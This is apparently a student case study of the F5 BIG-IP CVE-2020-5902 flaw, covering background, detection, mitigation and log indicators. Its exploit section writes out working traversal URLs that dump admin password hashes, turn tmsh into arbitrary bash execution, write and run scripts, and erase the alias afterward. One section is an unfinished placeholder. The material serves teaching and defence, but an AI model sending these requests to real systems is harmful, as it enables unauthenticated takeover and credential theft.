# CVE 2020-5902

![alt text](https://www.zdnet.com/a/hub/i/2020/07/03/b6c96e0e-7da9-461a-adff-d6009723189a/f5-networks.jpg "F5 Networks Logo")

_Presented by: Tharmiga Loganathan, Manavjot Singh, Mili Choksi_

**Vulnerability Highlights:**

CVSS 3.x: 9.8 (Critical)

CVSS 2.0: 10.0 (High)

_The CVE 2020-5902 vulnerability impacted F5 Network's suite of load-balancing software products called BIG-IP last July. It is a code injection attack that can give hackers root level privileges to vulnerable systems! According to Shodan, there were 8,000 exposed devices at one point with an estimated 2,000 of those devices actually vulnerable to this exploit._

> **What is Shodan?**
> At first look, Shodan can be used to search devices connected to the Internet according to different filters. However, in more negative use-cases, it can be used streamline the process of searching for vulnerable devices.
  

## What is BIG-IP?

BIG-IP is a family of software and hardware solutions from F5 Networks. While it originally started out as a load balancer, it has now expanded to offer complimentary services such as traffic management, access control, security and optimization. Load balancers work by providing a virtual IP on behalf of numerous other devices. This is a service that allows large scale applications to seamlessly serve its customers without a bottleneck. 

This exploit is particularly impactful because it can not only impact the load balancing server itself but also any device that is behind the load balancer. 

## CVE Timeline

There has been a rise in the number of vulnerabilities among similar software products around the time this vulnerability came out. The very day the exploit got out, F5 Networks has created many articles, videos, and Q&A sessions designed to help its customers keep their systems safe. But it didn't take long for **many** proof of concept code snippets to pop up on GitHub.

![alt text](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/images/blog/PoC%20scripts%20published%20to%20GitHub.png "GitHub Exploit Code")

Let's dive right into the exploit now!

## The Exploit

This code injection vulnerability impacts the TMUI (configuration utility for the BIG-IP) and can allow unauthenicated users to execute system commands, create or delete files, disable services or execute Java code. The TMUI is a web application that is installed within the device that provides an admin interface. The following is the vulnerable URL:
```
https://[hostname]/tmui/login.jsp
```
The exploit is a "..;" following the above URL. The URL below is an example of an exploitable URL that will return a list of all of the admin users along with their password hashes:
```
https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
```

> **The Three Most Common Exploits**
> 
> Execute Command (only allows for tmsh commands):
> ```
> /tmui/locallb/workspace/tmshCmd.jsp
> ```
> 
> Read Files:
> ```
> /tmui/locallb/workspace/fileRead.jsp
> ```
> 
> Write Files:
> ```
> /tmui/locallb/workspace/fileSave.jsp
> ```

While the above execute command can only access tmsh commands, you can use "create alias" to allow execution of any bash command! "Create alias" can be used to link the tmsh "list" command to the "bash" command. The following is what the command will look like:

```
https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
```

Once the alias is created, more requests can be sent in the same manner in subsequent requests containing any bash commands the user would like to execute, the word "bash" in the command must simply be replaced with "list". 

Alternatively, instead of continually executing one line bash commands, you may want to have a whole script execute. You can save and execute a bash script on the server. First, you can save the script like so:

```
fileSave.jsp?fileName=/tmp/cmd&content=id
```

Second, execute the script like so (remember "list" actually means "bash":

```
tmshCmd.jsp?command=list+/tmp/cmd
```

Finally, in order to delete the alias and clean up:

```
https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
```

## Why This Exploit Works

[content]

## Detecting Exploits 

The following command can be used as a test to see if you are vulnerable. If the exploit works, it means you are vulnerable and it will simply return the version of BIG-IP you are currently running:
```
https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
```
If you find that you are vulnerable, you may want to also check to check your logs to see if you have been exploited. You may see signs of an exploit by reviewing your logs at `/var/log/audit`. More specifically, based on what we've learned, you may notice a `cmd_data=delete cli alias private list` if a hacker has tried to delete the alias they have created.

You are also likely to find files in `/tmp` created by "tomcat" that have bash commands in them.

## How does this impact me?

Even if you aren't running an F5 BIG-IP device, but have some external link to a javascript library included in your application, your application may also be exposed! If the resource happens to be behind a BIG-IP load balancer that is vulnerable, your application can also be exploited. More on how to prevent this vulnerability later. This highlights the importance of staying on top of cybersecurity news and taking all possible precautions when building your application!

## Mitigation

There is a patch F5 has published, F5 recommends that you update to the latest version. 

However, the number one way to prevent this is to not expose the admin interface of the server to the public in the first place. Best practice instead would be to require a VPN to access the interface. This was actually warned against by F5 multiple times, but people who haven't listened still remain vulnerable.

As mentioned earlier, you may still be vulnerable even if you are not using an F5 server. If your application contains an external link to a Javascript library for example, and _that_ server is behind a BIG-IP, you may still be vulnerable. Again, the number one prevention in this scenario is to use best practices. Best practices when including external libaries would be to use subresource integrity, this is a hash that is added to the script tag. This ensures that the browser checks to make sure the hash matches each time the library is loaded, if the hash doesn't match, the library won't load altogether and you will remain protected. This is an example of what the script tag might look like with the hash:

```
<script src="https://example.com/something.js" integrity="sha384-oqVuAfap76u8xc" crossorigin="anonymous"></script>
```

## Key Takeaways

This case study highlights the importance of staying on top of cybersecurity news and to use best practices when configuring and server and/or building any web application.

## Resources

[CVE 2020-5902 Quick Overview and Impact](https://www.tenable.com/blog/cve-2020-5902-critical-vulnerability-in-f5-big-ip-traffic-management-user-interface-tmui)

[What is BIG-IP](https://devcentral.f5.com/s/articles/what-is-big-ip-24596#:~:text=F5's%20BIG%2DIP%20is%20a,access%20control%2C%20and%20security%20solutions.&text=This%20is%20different%20from%20BIG,F5%20Silverline%2C%20F5's%20SaaS%20platform.) 

[Understanding the Exploit](https://www.youtube.com/watch?v=NmZFwE537Zg&ab_channel=SANSInstitute)

[Protecting Against BIG-IP Vulnerability](https://www.f5.com/services/support/big-ip-vulnerability-cve-2020-5902)

